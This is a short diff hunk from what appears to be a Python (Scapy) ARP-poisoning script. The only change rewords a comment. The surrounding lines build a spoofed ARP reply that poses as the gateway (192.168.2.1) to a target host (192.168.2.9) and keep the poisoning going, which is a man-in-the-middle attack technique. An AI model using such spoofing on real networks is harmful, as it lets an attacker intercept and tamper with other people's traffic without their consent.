@@ -25,7 +25,7 @@ poisonedTarget.pdst = "192.168.2.9"
 
 # Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
 # The packet by default will have our mac address as a source;
-# We can specify a mac address by poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
+# Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
 poisonedTarget.psrc = "192.168.2.1"
 
 # Keep poisoning the ARP;
